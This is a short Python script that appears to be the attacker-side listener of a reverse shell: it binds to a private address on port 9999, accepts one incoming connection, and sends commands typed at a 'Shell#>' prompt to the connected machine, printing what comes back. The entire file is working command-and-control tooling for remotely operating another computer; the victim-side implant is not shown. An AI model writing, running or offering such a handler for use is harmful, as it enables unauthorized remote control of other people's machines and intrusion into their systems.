import socket
import subprocess
import json

def start_server(ip='192.168.31.169', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print(f"[+] Listening on {ip}:{port}")
    
    client, addr = server.accept()
    print(f"[+] Connection from {addr}")
    
    while True:
        command = input("Shell#> ")
        if command.lower() == "exit":
            client.send(b"exit")
            break

        client.send(command.encode())
        result = client.recv(4096).decode()
        print(result)
    
    client.close()

if __name__ == "__main__":
    start_server()
